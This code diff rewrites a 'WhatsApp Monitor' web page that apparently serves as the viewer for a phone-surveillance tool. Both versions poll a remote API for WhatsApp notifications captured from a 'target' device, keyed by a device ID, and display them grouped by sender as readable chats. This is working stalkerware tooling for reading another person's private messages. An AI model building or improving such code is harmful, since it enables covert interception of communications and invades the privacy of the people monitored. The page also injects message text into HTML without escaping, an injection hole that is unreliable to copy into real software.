@@ -2,297 +2,150 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>WhatsApp Monitor</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        /* --- WHATSAPP DARK THEME --- */
-        body { 
-            margin: 0; background-color: #111b21; font-family: Helvetica, Arial, sans-serif; 
-            color: #e9edef; height: 100vh; overflow: hidden; display: flex; justify-content: center;
-        }
-        .app-container {
-            width: 100%; height: 100%; max-width: 450px; background-color: #111b21;
-            position: relative; box-shadow: 0 0 20px rgba(0,0,0,0.5); display: flex; flex-direction: column;
-        }
-
-        /* VIEW 1: CONTACT LIST */
-        #contactListView { display: flex; flex-direction: column; height: 100%; width: 100%; }
-        .main-header {
-            padding: 10px 15px; display: flex; align-items: center; gap: 15px;
-            background-color: #202c33; border-bottom: 1px solid #2a3942; z-index: 5; height: 40px;
-        }
-        .back-btn-main { font-size: 1.2rem; color: #aebac1; cursor: pointer; }
-        .app-title { font-size: 1.3rem; font-weight: bold; color: #8696a0; flex: 1; }
-        .top-icons { display: flex; gap: 20px; color: #aebac1; font-size: 1.1rem; }
-
-        .contact-list { flex: 1; overflow-y: auto; position: relative; }
+        /* WhatsApp Theme Styles */
+        body { margin: 0; font-family: sans-serif; background-color: #111b21; color: #e9edef; display: flex; height: 100vh; overflow: hidden; }
         
-        /* Loading Animation */
-        .loader-container {
-            display: flex; flex-direction: column; align-items: center; justify-content: center;
-            padding-top: 50px; color: #00a884;
-        }
-        .spinner {
-            border: 4px solid #2a3942; border-top: 4px solid #00a884; border-radius: 50%;
-            width: 30px; height: 30px; animation: spin 1s linear infinite; margin-bottom: 10px;
-        }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        /* Left Sidebar (Contact List) */
+        .sidebar { width: 30%; background-color: #202c33; border-right: 1px solid #374045; display: flex; flex-direction: column; }
+        .header { background-color: #202c33; padding: 15px; border-bottom: 1px solid #374045; font-weight: bold; color: #aebac1; }
+        .contact-list { flex: 1; overflow-y: auto; }
+        .contact { display: flex; align-items: center; padding: 12px; cursor: pointer; border-bottom: 1px solid #2a3942; transition: 0.2s; }
+        .contact:hover { background-color: #2a3942; }
+        .avatar { width: 45px; height: 45px; background-color: #00a884; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 20px; color: white; margin-right: 15px; }
+        .info { flex: 1; }
+        .name { font-size: 16px; color: #e9edef; font-weight: 500; }
+        .last-msg { font-size: 13px; color: #8696a0; margin-top: 3px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; max-width: 200px; }
 
-        .contact-item { display: flex; align-items: center; padding: 12px 15px; cursor: pointer; border-bottom: 1px solid #222; }
-        .contact-item:active { background: #202c33; }
-        .dp-circle { width: 45px; height: 45px; border-radius: 50%; background: #667781; display: flex; justify-content: center; align-items: center; margin-right: 15px; color: #fff; font-size: 1.5rem; overflow: hidden;}
-        .contact-info { flex: 1; overflow: hidden; }
-        .row-top { display: flex; justify-content: space-between; margin-bottom: 4px; }
-        .name { font-size: 1rem; font-weight: 500; color: #e9edef; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; max-width: 70%; }
-        .time { font-size: 0.75rem; color: #8696a0; min-width: 50px; text-align: right;}
-        .last-msg { font-size: 0.85rem; color: #8696a0; display: -webkit-box; -webkit-line-clamp: 1; -webkit-box-orient: vertical; overflow: hidden; }
-
-        /* VIEW 2: CHAT */
-        #chatDetailView { display: none; flex-direction: column; height: 100%; position: absolute; top: 0; left: 0; width: 100%; background: #0b141a; z-index: 10; }
-        .chat-header { background-color: #202c33; padding: 5px 10px; display: flex; align-items: center; gap: 10px; height: 50px; }
-        .back-arrow { font-size: 1.2rem; color: #aebac1; padding: 8px; cursor: pointer; }
-        .chat-area { 
-            flex: 1; padding: 15px; overflow-y: auto; display: flex; flex-direction: column;
-            background-image: url('https://user-images.githubusercontent.com/15075759/28719144-86dc0f70-73b1-11e7-911d-60d70fcded21.png');
-            background-size: 400px; background-color: #0b141a; 
-        }
-        .message { max-width: 75%; margin-bottom: 5px; padding: 6px 10px 8px 9px; border-radius: 8px; font-size: 0.9rem; position: relative; line-height: 1.3; word-wrap: break-word; }
-        .msg-left { background-color: #202c33; align-self: flex-start; border-top-left-radius: 0; color: #fff; }
-        .msg-right { background-color: #005c4b; align-self: flex-end; border-top-right-radius: 0; color: #fff; } /* Added for future sent msgs */
+        /* Right Side (Chat Window) */
+        .chat-area { flex: 1; display: flex; flex-direction: column; background-image: url('https://user-images.githubusercontent.com/15075759/28719144-86dc0f70-73b1-11e7-911d-60d70fcded21.png'); background-color: #0b141a; }
+        .chat-header { background-color: #202c33; padding: 10px 20px; display: flex; align-items: center; border-bottom: 1px solid #374045; }
+        .chat-title { font-size: 18px; margin-left: 15px; }
         
-        .msg-time { font-size: 0.65rem; color: #aebac1; float: right; margin-top: 5px; margin-left: 8px; }
-        .chat-footer { background-color: #202c33; padding: 8px 10px; display: flex; align-items: center; gap: 10px; }
-        .fake-input { flex: 1; background: #2a3942; padding: 10px 15px; border-radius: 20px; color: #8696a0; font-size: 0.95rem; border: none; outline: none; }
+        .messages { flex: 1; padding: 20px; overflow-y: auto; display: flex; flex-direction: column; gap: 10px; }
+        
+        /* Message Bubbles */
+        .msg { max-width: 60%; padding: 8px 12px; border-radius: 8px; font-size: 14.5px; line-height: 1.4; position: relative; word-wrap: break-word; }
+        .incoming { align-self: flex-start; background-color: #202c33; color: #e9edef; border-top-left-radius: 0; }
+        .outgoing { align-self: flex-end; background-color: #005c4b; color: #e9edef; border-top-right-radius: 0; } /* Future use */
+        
+        .time { font-size: 11px; color: #8696a0; text-align: right; margin-top: 4px; display: block; }
+
+        /* Scrollbar */
+        ::-webkit-scrollbar { width: 6px; }
+        ::-webkit-scrollbar-thumb { background: #374045; }
     </style>
 </head>
 <body>
 
-    <div class="app-container">
-        
-        <div id="contactListView">
-            <div class="main-header">
-                <i class="fa-solid fa-arrow-left back-btn-main" onclick="window.location.href='index.html'"></i>
-                <span class="app-title">WhatsApp</span>
-                <div class="top-icons">
-                    <i class="fa-solid fa-camera"></i>
-                    <i class="fa-solid fa-magnifying-glass"></i>
-                    <i class="fa-solid fa-ellipsis-vertical"></i>
-                </div>
-            </div>
-            <div class="contact-list" id="contactsContainer">
-                <div class="loader-container">
-                    <div class="spinner"></div>
-                    <p id="statusText">Connecting to Target...</p>
-                </div>
-            </div>
+    <div class="sidebar">
+        <div class="header">Chats</div>
+        <div class="contact-list" id="contactList">
+            <div style="padding:20px; text-align:center; color:#8696a0;">Loading...</div>
         </div>
+    </div>
 
-        <div id="chatDetailView">
-            <div class="chat-header">
-                <i class="fa-solid fa-arrow-left back-arrow" onclick="closeChat()"></i>
-                <div class="dp-circle" style="width: 35px; height: 35px; margin-right: 10px;">
-                    <i class="fa-solid fa-user"></i>
-                </div>
-                <div style="flex: 1; overflow:hidden;">
-                    <h3 id="headerName" style="margin:0; font-size: 1rem; font-weight: 500; white-space:nowrap; text-overflow:ellipsis;">User</h3>
-                </div>
-                <i class="fa-solid fa-video" style="color: #aebac1; margin-right: 20px;"></i>
-                <i class="fa-solid fa-phone" style="color: #aebac1; margin-right: 15px;"></i>
-                <i class="fa-solid fa-ellipsis-vertical" style="color: #aebac1;"></i>
-            </div>
-            <div class="chat-area" id="messagesContainer"></div>
-            <div class="chat-footer">
-                <i class="fa-solid fa-plus" style="color: #8696a0; font-size: 1.2rem;"></i>
-                <input type="text" class="fake-input" placeholder="Message" readonly>
-                <i class="fa-solid fa-microphone" style="color: #8696a0; font-size: 1.2rem;"></i>
-            </div>
+    <div class="chat-area">
+        <div class="chat-header" id="chatHeader" style="display:none;">
+            <div class="avatar" id="headerAvatar">?</div>
+            <div class="chat-title" id="headerName">Select a Contact</div>
         </div>
-
+        <div class="messages" id="messageBox">
+            <div style="margin:auto; color:#8696a0;">Select a contact to view history</div>
+        </div>
     </div>
 
     <script>
-        // --- CONFIG ---
-        const DEVICE_ID = localStorage.getItem('monitoring_id');
-        const BASE_URL = "https://child-v9no.onrender.com/api/get-data"; 
-        
-        // Fetch SPECIFIC whatsapp file
-        const DATA_TYPE = "whatsapp";
+        // URL se Device ID nikalo (?deviceId=xxxx)
+        const urlParams = new URLSearchParams(window.location.search);
+        const deviceId = urlParams.get('deviceId');
 
-        if (!DEVICE_ID) {
-            alert("Device ID Missing!");
-            window.location.href = 'index.html';
+        let allData = [];
+
+        if (!deviceId) {
+            alert("Device ID missing in URL!");
+        } else {
+            fetchMessages();
+            // Har 10 second me refresh karo
+            setInterval(fetchMessages, 10000);
         }
 
-        let groupedChats = {};
-
-        // 1. Fetch Data
-        async function fetchWhatsAppData() {
+        async function fetchMessages() {
             try {
-                const response = await fetch(`${BASE_URL}/${DEVICE_ID}/${DATA_TYPE}`);
-                const result = await response.json();
+                const response = await fetch(`/api/get-notifications?deviceId=${deviceId}`);
+                const rawData = await response.json();
 
-                if (Array.isArray(result) && result.length > 0) {
-                    processLogs(result);
-                } else {
-                    document.getElementById('contactsContainer').innerHTML = 
-                        "<p style='text-align:center; color:#888; margin-top:50px'>No WhatsApp Chats Found</p>";
-                }
+                // Sirf WhatsApp ka data filter karo
+                allData = rawData.filter(item => 
+                    item.packageName && item.packageName.includes("whatsapp")
+                );
+                
+                renderContacts();
             } catch (error) {
-                console.error("Fetch Error:", error);
+                console.error("Error fetching data:", error);
             }
         }
 
-        // 2. Process & Group Data (UPDATED LOGIC)
-        function processLogs(logs) {
-            groupedChats = {};
-            
-            // Sort: Oldest to Newest for correct chat history
-            logs.sort((a, b) => (a.time || 0) - (b.time || 0));
+        function renderContacts() {
+            const list = document.getElementById('contactList');
+            const contacts = {};
 
-            logs.forEach(log => {
-                let rawTitle = (log.title || "").trim();
-                let rawText = (log.text || "").trim();
-                let time = log.time || Date.now();
-
-                // --- GARBAGE FILTER ---
-                // Inko ignore karo
-                if (!rawText) return;
-                const lowerText = rawText.toLowerCase();
-                if (lowerText.includes("typing") || 
-                    lowerText.includes("online") || 
-                    lowerText.includes("checking for new messages") ||
-                    lowerText.includes("whatsapp") || // Generic app name in text
-                    rawText.includes("messages from") // Generic notification
-                ) {
-                    return;
-                }
-
-                let senderName = "Unknown";
-                let messageBody = rawText;
-
-                // --- SMART NAME DETECTION ---
-                
-                // Case 1: Title is "WhatsApp" -> Look inside Text for "Name: Message"
-                if (rawTitle === "WhatsApp") {
-                    if (rawText.includes(":")) {
-                        // Pattern: "Dad: Come home"
-                        let parts = rawText.split(":");
-                        // Make sure the first part isn't too long to be a name
-                        if(parts[0].length < 30) {
-                            senderName = parts[0].trim();
-                            messageBody = parts.slice(1).join(":").trim(); // Rejoin rest
-                        } else {
-                            // Text is too long to be a name header, treat as generic system msg
-                            return; 
-                        }
-                    } else {
-                        // Just "WhatsApp" title and random text? Put in Notifications
-                        senderName = "WhatsApp Notifications";
-                    }
-                } 
-                // Case 2: Title is a real Name (e.g. "Rahul", "Mom")
-                else if (rawTitle.length > 0 && rawTitle !== "WhatsApp") {
-                    senderName = rawTitle;
-                    messageBody = rawText;
-                } 
-                // Case 3: No Title
-                else {
-                    senderName = "Unknown Sender";
-                }
-
-                // Initialize Group if new
-                if (!groupedChats[senderName]) {
-                    groupedChats[senderName] = {
-                        name: senderName,
-                        lastMsg: "",
-                        time: 0,
-                        msgs: []
-                    };
-                }
-
-                // Add Message
-                groupedChats[senderName].msgs.push({
-                    text: messageBody,
-                    timeStr: new Date(time).toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'})
-                });
-                
-                // Update Preview
-                groupedChats[senderName].lastMsg = messageBody;
-                groupedChats[senderName].time = time;
+            // Data ko Sender (Title) ke hisab se group karo
+            allData.forEach(msg => {
+                const name = msg.title || "Unknown";
+                if (!contacts[name]) contacts[name] = [];
+                contacts[name].push(msg);
             });
 
-            renderList();
+            list.innerHTML = "";
+            
+            Object.keys(contacts).forEach(name => {
+                const msgs = contacts[name];
+                const lastMsg = msgs[msgs.length - 1]; // Sabse naya message
+
+                const div = document.createElement('div');
+                div.className = 'contact';
+                div.innerHTML = `
+                    <div class="avatar">${name.charAt(0).toUpperCase()}</div>
+                    <div class="info">
+                        <div class="name">${name}</div>
+                        <div class="last-msg">${lastMsg.text}</div>
+                    </div>
+                `;
+                div.onclick = () => openChat(name, msgs);
+                list.appendChild(div);
+            });
         }
 
-        // 3. Render List
-        function renderList() {
-            const container = document.getElementById('contactsContainer');
-            const names = Object.keys(groupedChats);
+        function openChat(name, messages) {
+            document.getElementById('chatHeader').style.display = 'flex';
+            document.getElementById('headerName').innerText = name;
+            document.getElementById('headerAvatar').innerText = name.charAt(0).toUpperCase();
 
-            if (names.length === 0) {
-                container.innerHTML = "<p style='text-align:center; padding-top:20px; color:#888'>Data parsed but all empty.</p>";
-                return;
-            }
+            const box = document.getElementById('messageBox');
+            box.innerHTML = "";
 
-            // Sort by Latest Time (Newest on top)
-            names.sort((a, b) => groupedChats[b].time - groupedChats[a].time);
+            // Messages ko time ke hisab se sort karo
+            messages.sort((a, b) => a.postTime - b.postTime);
 
-            let html = "";
-            names.forEach(name => {
-                const chat = groupedChats[name];
-                
-                // Icon Logic: If it's a real person -> User Icon, else Bell Icon
-                const icon = (name === "WhatsApp Notifications") ? "fa-bell" : "fa-user";
+            messages.forEach(msg => {
+                const date = new Date(parseInt(msg.postTime));
+                const timeStr = date.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
 
-                html += `
-                    <div class="contact-item" onclick="openChat('${name}')">
-                        <div class="dp-circle"><i class="fa-solid ${icon}"></i></div>
-                        <div class="contact-info">
-                            <div class="row-top">
-                                <span class="name">${chat.name}</span>
-                                <span class="time">${new Date(chat.time).toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'})}</span>
-                            </div>
-                            <div class="last-msg">${chat.lastMsg}</div>
-                        </div>
-                    </div>`;
-            });
-            container.innerHTML = html;
-        }
-
-        // 4. Open Chat Logic
-        function openChat(name) {
-            const chat = groupedChats[name];
-            if(!chat) return;
-
-            document.getElementById('headerName').innerText = chat.name;
-            const msgBox = document.getElementById('messagesContainer');
-            msgBox.innerHTML = "";
-
-            chat.msgs.forEach(m => {
-                msgBox.innerHTML += `
-                    <div class="message msg-left">
-                        ${m.text}
-                        <span class="msg-time">${m.timeStr}</span>
-                    </div>`;
+                const div = document.createElement('div');
+                div.className = 'msg incoming';
+                div.innerHTML = `
+                    ${msg.text.replace(/\n/g, '<br>')}
+                    <span class="time">${timeStr}</span>
+                `;
+                box.appendChild(div);
             });
 
-            document.getElementById('contactListView').style.display = 'none';
-            document.getElementById('chatDetailView').style.display = 'flex';
-            
             // Scroll to bottom
-            msgBox.scrollTop = msgBox.scrollHeight;
+            box.scrollTop = box.scrollHeight;
         }
-
-        function closeChat() {
-            document.getElementById('chatDetailView').style.display = 'none';
-            document.getElementById('contactListView').style.display = 'flex';
-        }
-
-        // Start Fetching
-        fetchWhatsAppData();
-        setInterval(fetchWhatsAppData, 5000); 
-
     </script>
 </body>
 </html>
